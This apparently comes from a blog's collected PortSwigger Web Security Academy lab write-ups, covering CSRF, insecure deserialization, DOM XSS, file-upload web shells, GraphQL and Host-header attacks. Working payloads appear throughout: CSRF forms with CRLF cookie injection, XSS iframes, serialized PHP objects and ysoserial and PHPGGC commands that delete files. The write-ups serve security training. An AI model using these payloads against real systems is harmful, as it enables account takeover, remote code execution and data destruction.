an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou have two accounts on the application that you can use to help design your attack. The credentials are as follows:\nwiener:peter carlos:montoya As the CSRF token is associated with it\u0026rsquo;s cookie CSRFKey, we have to somehow inject the token and set the cookie in victim\u0026rsquo;s browser. How can we set the cookie? Chain vulnerability? Let\u0026rsquo;s see the website. In website, we can see there is a search functionality, whatever you search will be reflected in the source code, but the tags are getting URL encoded, but if you see the request carefully, it is tracking the LastSearchTerm value, which is the same string we have searched on browser. How can we exploit this? Can we set another cookie by line breaking into the original? It seems, we can! Let\u0026rsquo;s see how. If we go to repeater, and enter payload %0d%0a then it will break the cookie into new line and then we can set the new cookie value to Set-Cookie: csrfKey=aabb; SameSite=None;. So the overall search will be /?search=aabbcc%0d%0aSet-Cookie:+csrfKey=aabb;+SameSite=None\nNow that we have the idea of how to set the cookie, let\u0026rsquo;s craft CSRF payload to execute the attack, in this case we will use image tag to load the cookie into browser and then on error we will submit.\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a8700c004d1937b82eabaa8007a0015.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hacked@normal-user.net\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;3kQnxIDTWfievsPGPw2HFGBTtfT1aOl3\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;img src=\u0026#34;https://0a8700c004d1937b82eabaa8007a0015.web-security-academy.net/?search=aabbcc%0d%0aSet-Cookie:+csrfKey=V176vxxmV20RH7d9X6wrKlYlwtdYt7SM;+SameSite=None\u0026#34; onerror=\u0026#34;document.forms[0].submit()\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; So, what we\u0026rsquo;re doing here is - when the exploit loads, it will execute image and sets the cookie, but as the image doesnot exists, it will execute onerror and submit the form.\nSolution: Add your csrfkey in cookie and change csrf token to ununsed one.\n6.

It attempts to use the insecure \u0026ldquo;double submit\u0026rdquo; CSRF prevention technique.\nTo solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou can log in to your own account using the following credentials: wiener:peter\nMy first thought was, if I grab the cookie directly using document.cookie I can able to perform this attack easily. But when I\u0026rsquo;ve tested document.cookie in browser\u0026rsquo;s console, it showed me ''. I am confused, as the cookie is already there in dev tools, why it is showing empty.\nThere, our answer (https://stackoverflow.com/a/18251941)\nHttpOnly cookies cannot be accessed from Javascript and session cookies are usually set as HttpOnly cookies. See also this StackOverflow question: How to read a secure cookie using JavaScript\nSo\u0026hellip; check whether the cookie you want to read has the \u0026lsquo;HttpOnly\u0026rsquo; flag set\u0026hellip; If so, you know the culprit. It\u0026rsquo;s not a bug, it\u0026rsquo;s a feature!\nSo, I guess we have to do it old style boyz. From previous challenge\u0026rsquo;s payload, we just have to tweak some values, as the cookie\u0026rsquo;s CSRF and request body\u0026rsquo;s CSRF should be same.\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a73003d03f9952680bfb7af00e70087.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hacked@normal-user.net\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;aaaaaa\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;img src=\u0026#34;https://0a73003d03f9952680bfb7af00e70087.web-security-academy.net/?search=aabbcc%0d%0aSet-Cookie:+csrf=aaaaaa;+SameSite=None\u0026#34; onerror=\u0026#34;document.forms[0].submit()\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Use above payload and send it to victim.\n7. Lab: SameSite Lax bypass via method override This lab\u0026rsquo;s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim\u0026rsquo;s email address. You should use the provided exploit server to host your attack.\nYou can log in to your own account using the following credentials: wiener:peter\nAfter login, we can see into the cookie section, SamSite is empty, and by default it will consider it Lax.\nIf you use previous exploit, it will work, as it will have same site, but when we try to deliver exploit to victim, the lab is not getting solved. Maybe because of cookie restrictions.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a0200c70465532e814cc01d0093006c.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hehe@normal-user.net\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now, let\u0026rsquo;s see what is going on by changing email from our account.\nWhat if we convert the request to GET instead of POST?\nWe can see Method Not Allowed in response when we have changed the request from POST to GET. Now the idea to solve this challenge is, we will send GET request but some frameworks such as Symfony or Laravel supports changing method inside form that is called Method Spoofing - https://codeigniter4.github.io/userguide/incoming/methodspoofing.html\nSo the resultant payload will be\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a0200c70465532e814cc01d0093006c.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hehe@normal-user.net\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;_method\u0026#34; value=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Send this payload to victim to solve the lab.\n8. Lab: SameSite Strict bypass via client-side redirect This lab\u0026rsquo;s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim\u0026rsquo;s email address. You should use the provided exploit server to host your attack.\nYou can log in to your own account using the following credentials: wiener:peter\nAfter login, if we see the developer console, we can see the cookie is set to SameSite=Strict. Also, there is no CSRF token when we try to change the email. But, when I changed it to GET request, it was also working.\nSo I am guessing bypassing the cookie will solve the lab. Like last challenge, there is no search functionality, but we can do comments! So, let\u0026rsquo;s try to post a comment and check the requests.\nIn one of the request, it is requesting resource at /resources/js/commentConfirmationRedirect.js and in response it handles redirection within same site.\n1 2 3 4 5 6 7 redirectOnConfirmation = (blogPath) =\u0026gt; { setTimeout(() =\u0026gt; { const url = new URL(window.location); const postId = url.searchParams.get(\u0026#34;postId\u0026#34;); window.location = blogPath + \u0026#39;/\u0026#39; + postId; }, 3000); } Alright, so basically, whatever we will try to add in query postId, it will be redirected to that page. Let\u0026rsquo;s redirect to /my-account page. We will use /post/comment/confirmation?postId=../my-account and we can see that it is redirected to my account. Next thing we will try is to use the GET request to change the user\u0026rsquo;s email address. So the resultant payload will be /post/comment/confirmation?postId=../my-account/change-email?email=changed%40test.com\u0026amp;submit=1. In response it gave \u0026quot;Missing parameter: 'submit'\u0026quot;. Well, we already passed submit in query, let\u0026rsquo;s try to url encode \u0026amp; with %26 and pass it again and boom, we can see it got changed. Now, making the final payload for exploit server.\n1 2 3 \u0026lt;script\u0026gt; window.location = \u0026#34;https://0ae600c1039fcc5781050c66009a008e.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40test.com%26submit=1\u0026#34;; \u0026lt;/script\u0026gt; Solution: Submitting the above payload will solve the lab\n9. Lab: SameSite Lax bypass via cookie refresh This lab\u0026rsquo;s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim\u0026rsquo;s email address. You should use the provided exploit server to host your attack.\nThe lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter\nIn this challenge, it has OAuth based login system. So, when I was trying to login and checking the requests via login, I can see multiple requests with oauth endpoint handling some kind of tokens and atleast it gave us the cookie and we are logged in into our account. Next thing I have noticed is, there is no CSRF token present in the change email request, so I immediately generated CSRF payload and test it in exploit server, and it worked. But after 2 minutes it will not work.\nFrom Portswigger webiste: If a website doesn\u0026rsquo;t include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn\u0026rsquo;t actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.\nAlright, so now we have to open a new window where it will do social-login so it will get new cookie without Lax and after like 3 seconds, it will send the form with CSRF token.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a6f00c50413ac878105257d0057004c.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hey@test.com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; window.onclick = () =\u0026gt; { window.open(\u0026#39;https://0a6f00c50413ac878105257d0057004c.web-security-academy.net/social-login\u0026#39;); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Use above payload in order to solve the lab\n10. Lab: CSRF where Referer validation depends on header being present This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.\nTo solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this lab, when I tried to change email, there is no CSRF token, so I directly generated the payload and test it in exploit server, but it says \u0026quot;Invalid referer header\u0026quot;.

Lab: CSRF with broken Referer validation This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.\nTo solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this challenge, if we try to login and then change email, there is no CSRF token used. So, I have tried to submit it directly, but got Invalid Referer Header error.\nIt seems the website only needs the domain name into the referer header, so we can simply pass that with ?domain query. Moreover, we can override this behavior by making sure that the response containing exploit has the Referrer-Policy: unsafe-url header set.\nHead:\nHTTP/1.1 200 OK\rContent-Type: text/html; charset=utf-8\rReferrer-Policy: unsafe-url Body:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;/?0a0300070336bf888092267c008400c5.web-security-academy.net.web-security-academy.net\u0026#34;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://0a0300070336bf888092267c008400c5.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hacked@test.com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Use above payload to solve the lab\n","description":"A collection of portswigger csrf writeups with examples, notes and writeups.","id":6,"section":"Portswigger","tags":["Portswigger","CSRF"],"title":"Portswigger CSRF Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-csrf/"},{"content":"1.

A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos\u0026rsquo;s home directory.\nYou can log in to your own account using the following credentials: wiener:peter\nYou also have access to a backup account: gregg:rosebud\nThis application have profile image path in serialized cookie, so if we delete account, it will also delete path located in avatar_link, so in order to delete a file from carlos\u0026rsquo;s directory, we will replace that path and send the request to solve the lab.\n1 O:4:\u0026#34;User\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:6:\u0026#34;wiener\u0026#34;;s:12:\u0026#34;access_token\u0026#34;;s:32:\u0026#34;roiaho63xcl9jnso5577p7xmr4t16yw8\u0026#34;;s:11:\u0026#34;avatar_link\u0026#34;;s:23:\u0026#34;/home/carlos/morale.txt\u0026#34;;} 4.

To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos\u0026rsquo;s home directory. You will need to obtain source code access to solve this lab.\nYou can log in to your own account using the following credentials: wiener:peter\nWhen we check the source code of the application, we got a path to PHP file. By adding ~ to the filename, we can able to read the source code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?php class CustomTemplate { private $template_file_path; private $lock_file_path; public function __construct($template_file_path) { $this-\u0026gt;template_file_path = $template_file_path; $this-\u0026gt;lock_file_path = $template_file_path . \u0026#34;.lock\u0026#34;; } private function isTemplateLocked() { return file_exists($this-\u0026gt;lock_file_path); } public function getTemplate() { return file_get_contents($this-\u0026gt;template_file_path); } public function saveTemplate($template) { if (!isTemplateLocked()) { if (file_put_contents($this-\u0026gt;lock_file_path, \u0026#34;\u0026#34;) === false) { throw new Exception(\u0026#34;Could not write to \u0026#34; . $this-\u0026gt;lock_file_path); } if (file_put_contents($this-\u0026gt;template_file_path, $template) === false) { throw new Exception(\u0026#34;Could not write to \u0026#34; . $this-\u0026gt;template_file_path); } } } function __destruct() { // Carlos thought this would be a good idea if (file_exists($this-\u0026gt;lock_file_path)) { unlink($this-\u0026gt;lock_file_path); } } } ?\u0026gt; There is a function __destruct which will unlink the file. Now instead of user\u0026rsquo;s serialized cookie: O:4:\u0026quot;User\u0026quot;:2:{s:8:\u0026quot;username\u0026quot;;s:6:\u0026quot;wiener\u0026quot;;s:12:\u0026quot;access_token\u0026quot;;s:32:\u0026quot;b5zuobushusnbom91vjdfegxxsk51bbn\u0026quot;;} we will make a new cookie that will use CustomTemplate to unlink the file.\nNew cookie will be:\n1 O:14:\u0026#34;CustomTemplate\u0026#34;:1:{s:14:\u0026#34;lock_file_path\u0026#34;;s:23:\u0026#34;/home/carlos/morale.txt\u0026#34;;} Although, this is not a valid user cookie, it will deserialize and execute before giving error, so it will delete the file and give the error. So The __destruct() magic method is automatically invoked and will delete Carlos\u0026rsquo;s file.\n5. Lab: Exploiting Java deserialization with Apache Commons This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don\u0026rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.\nTo solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos\u0026rsquo;s home directory.\nYou can log in to your own account using the following credentials: wiener:peter\nWe will use in order to generate payload.\njava -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64\nOr this in git bash java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.compiler=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.dom=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 \u0026quot;rm /home/carlos/morale.txt\u0026quot; | base64 -w0\nChanging the cookie value and URL encoding it will solve the lab.\n6. Lab: Exploiting PHP deserialization with a pre-built gadget chain This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don\u0026rsquo;t have source code access, you can still exploit this lab\u0026rsquo;s insecure deserialization using pre-built gadget chains.\nTo solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos\u0026rsquo;s home directory.\nYou can log in to your own account using the following credentials: wiener:peter\nFrom the source code, we can able to get this file /cgi-bin/phpinfo.php and in that file, there is SECRET_KEY leaked in environment.\nUsing PHPGGC we can get the Base64-encoded serialized object ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64\nYou now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:\nAssign the object you generated in PHPGGC to the $object variable. Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable. 1 2 3 4 5 \u0026lt;?php $object = \u0026#34;OBJECT-GENERATED-BY-PHPGGC\u0026#34;; $secretKey = \u0026#34;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\u0026#34;; $cookie = urlencode(\u0026#39;{\u0026#34;token\u0026#34;:\u0026#34;\u0026#39; . $object . \u0026#39;\u0026#34;,\u0026#34;sig_hmac_sha1\u0026#34;:\u0026#34;\u0026#39; . hash_hmac(\u0026#39;sha1\u0026#39;, $object, $secretKey) . \u0026#39;\u0026#34;}\u0026#39;); echo $cookie;` This will output a valid, signed cookie to the console. Replace session cookie with the malicious one you just created, then send the request to solve the lab.\n7. Lab: Exploiting Ruby deserialization using a documented gadget chain This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.\nTo solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos\u0026rsquo;s home directory.\nYou can log in to your own account using the following credentials: wiener:peter\nLog in to your own account and notice that the session cookie contains a serialized (\u0026ldquo;marshaled\u0026rdquo;) Ruby object. Send a request containing this session cookie to Burp Repeater. Browse the web to find the Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz on devcraft.io.

Lab: DOM-based cookie manipulation This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.\nIf we look into the javascript file, we will see it is setting window.location as document.cookie.\n1 2 \u0026lt;script\u0026gt;document.cookie = \u0026#39;lastViewedProduct=\u0026#39; + window.location + \u0026#39;; SameSite=None; Secure\u0026#39; \u0026lt;/script\u0026gt; /product?productId=1\u0026amp;%27\u0026gt;\u0026lt;script\u0026gt;print()\u0026lt;/script\u0026gt;\nSo we will use iframe: \u0026lt;iframe src=\u0026quot;https://LAB_ID.web-security-academy.net/product?productId=1\u0026amp;'\u0026gt;\u0026lt;script\u0026gt;print()\u0026lt;/script\u0026gt;\u0026quot; onload=\u0026quot;if(!window.x)this.src='https://LAB_ID.web-security-academy.net';window.x=1;\u0026quot;\u0026gt;\nThe original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim\u0026rsquo;s browser has the poisoned cookie saved, loading the home page will cause the payload to execute.\n3. Lab: DOM XSS using web messages This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.\nWhen we look at source code, we will see this,\n1 2 3 4 5 \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;message\u0026#39;, function(e) { document.getElementById(\u0026#39;ads\u0026#39;).innerHTML = e.data; }) \u0026lt;/script\u0026gt; When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.\nPayload: \u0026lt;iframe src=\u0026quot;https://LAB_ID.web-security-academy.net/\u0026quot; onload=\u0026quot;this.contentWindow.postMessage('\u0026lt;img src=1 onerror=print()\u0026gt;','*')\u0026quot;\u0026gt;\n4. Lab: DOM XSS using web messages and a JavaScript URL This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.\nThe home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings \u0026quot;http:\u0026quot; or \u0026quot;https:\u0026quot; anywhere within the web message. It also contains the sink location.href.\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;message\u0026#39;, function(e) { var url = e.data; if (url.indexOf(\u0026#39;http:\u0026#39;) \u0026gt; -1 || url.indexOf(\u0026#39;https:\u0026#39;) \u0026gt; -1) { location.href = url; } }, false); \u0026lt;/script\u0026gt; Payload: \u0026lt;iframe src=\u0026quot;https://LAB_ID.web-security-academy.net/\u0026quot; onload=\u0026quot;this.contentWindow.postMessage('javascript:print()//http:','*')\u0026quot;\u0026gt;\n5. Lab: DOM XSS using web messages and JSON.parse This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.\nThe home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse(). In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;message\u0026#39;, function(e) { var iframe = document.createElement(\u0026#39;iframe\u0026#39;), ACMEplayer = {element: iframe}, d; document.body.appendChild(iframe); try { d = JSON.parse(e.data); } catch(e) { return; } switch(d.type) { case \u0026#34;page-load\u0026#34;: ACMEplayer.element.scrollIntoView(); break; case \u0026#34;load-channel\u0026#34;: ACMEplayer.element.src = d.url; break; case \u0026#34;player-height-changed\u0026#34;: ACMEplayer.element.style.width = d.width + \u0026#34;px\u0026#34;; ACMEplayer.element.style.height = d.height + \u0026#34;px\u0026#34;; break; } }, false); \u0026lt;/script\u0026gt; Payload: \u0026lt;iframe src=https://LAB_ID.web-security-academy.net/ onload='this.contentWindow.postMessage(\u0026quot;{\\\u0026quot;type\\\u0026quot;:\\\u0026quot;load-channel\\\u0026quot;,\\\u0026quot;url\\\u0026quot;:\\\u0026quot;javascript:print()\\\u0026quot;}\u0026quot;,\u0026quot;*\u0026quot;)'\u0026gt;\n","description":"A collection of portswigger dom based writeups with examples, notes and writeups.","id":8,"section":"Portswigger","tags":["Portswigger","DOM-BASED"],"title":"Portswigger DOM Based Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-dom-based/"},{"content":"1. Lab: Remote code execution via web shell upload This lab contains a vulnerable image upload function. It doesn\u0026rsquo;t perform any validation on the files users upload before storing them on the server\u0026rsquo;s filesystem.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.

Lab: Web shell upload via Content-Type restriction bypass This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: wiener:peter\nSame previous solution worked here too! The only thing to take care is mime type. If mime type is image but name is .php and the content is shell then it will execute!\nSolution: Mime type bypass with name and content\n3. Lab: Web shell upload via path traversal This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: wiener:peter\nFirstly we will try to upload the shell using simple file upload technique, but for some reason, we are getting content of the file instead of executing that php content. /files/avatars/L.php\nWhat we will do is, instead of uploading to files directory instead of avatars by directory traversal filename=\u0026quot;..%2fL.php\u0026quot; -\u0026gt; /files/L.php (without url encoding /, it will not work)\nAnd yes, we got the secret value.\nSolution: Using LFI, we can upload images to different location\n4. Lab: Web shell upload via extension blacklist bypass This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this application, I have tried to upload shell with different file extensions, but nothing seems to be working. As the server is apache, we will try to upload .htaccess and change the configuration of php executables.\nWith this line, AddType application/x-httpd-php .test, we can configure another php extension to .test, so if we upload the shell as L.test, it will execute php code. Set content type to plain/text, filename to .htaccess\nNext, we will upload the shell using name L.test and view it in browser.\nSolution: Always check if we can able to rewrite configuration files.\n5. Lab: Web shell upload via obfuscated file extension This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

Lab: Remote code execution via polyglot web shell upload This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: wiener:peter\nWe can solve this lab using magic bytes. For example, JPEG files always begin with the bytes FF D8 FF. But instead of that mess, we can simply use GIF8 to bypass that (which acts similar way)\nSolution: Use magic bytes\n7. Lab: Web shell upload via race condition This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this application, only jpg and png images are allowed, but for fraction of second it stores the image temporarily on file system and then do validation. If there is validation failure then it will delete the file, so for a small interval the file is in the system, so we can send parallel connection that uploads the shell and executes it.\nSolution: With race condition, we can able to get the secret.\n","description":"A collection of portswigger file upload writeups with examples, notes and writeups.","id":9,"section":"Portswigger","tags":["Portswigger","FILE-UPLOAD"],"title":"Portswigger File Upload Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-file-upload/"},{"content":"1.

The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.\nTo solve the lab, sign in as the administrator and delete the username carlos.\nLearn more about Working with GraphQL in Burp Suite.\nIf we open Inql tab and open the query in graphql, on the left side, we can see there is getUser query and in that query at ID 1 we can able to get administrator password.\nLogin with these credentials, we can able to access admin panel and then delete carlos user.\n3. Lab: Finding a hidden GraphQL endpoint The user management functions for this lab are powered by a hidden GraphQL endpoint. You won\u0026rsquo;t be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.\nTo solve the lab, find the hidden endpoint and delete carlos.\nLearn more about Working with GraphQL in Burp Suite.\nIn this application, the graphql endpoint is hidden so I have done a quick scan and found the endpoint at /api and the introspection query will not work, so we have to add %0a in schema in order to bypass that protection. (__schema%0A). Now we can able to get the graphql schema.\nNext thing I have done is downloaded that schema and uploaded to INQL extension and then I got the queries and mutations.\nFrom the query we got the ID of carlos which is 3 and from the mutation we can able to delete it. Use same mutation with URL encoding and pass it to /api?query=\u0026lt;mutation\u0026gt;.\n4. Lab: Bypassing GraphQL brute force protections The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.\nTo solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.\nLearn more about Working with GraphQL in Burp Suite.\nIn this application we have to brute force carlos password, but rate limiting is there in the website, so we cannot send request separately. So we have to use batch query and then bruteforce the password.\nmutation { bruteforce0:login(input:{password: \u0026#34;123456\u0026#34;, username: \u0026#34;carlos\u0026#34;}) { token success } bruteforce1:login(input:{password: \u0026#34;password\u0026#34;, username: \u0026#34;carlos\u0026#34;}) { token success } ... bruteforce99:login(input:{password: \u0026#34;12345678\u0026#34;, username: \u0026#34;carlos\u0026#34;}) { token success } } Use the search bar below the response to search for the string true.

So we will make use of that and give alert.\n2. Lab: Host header authentication bypass This lab makes an assumption about the privilege level of the user based on the HTTP Host header.\nTo solve the lab, access the admin panel and delete the user carlos.\nI have checked robots.txt and in that page, it says /admin is not allowed, we will go to /admin and it says only local user can access it.\nSo I have changed the host to localhost and send the request again, and it worked.\nNow, deleting carlos user will solve the lab.\n3. Lab: Routing-based SSRF This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.\nTo solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.\nI have changed the host and sent it to intruder for the last octet and found 206.

Lab: JWT authentication bypass via jwk header injection This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token.

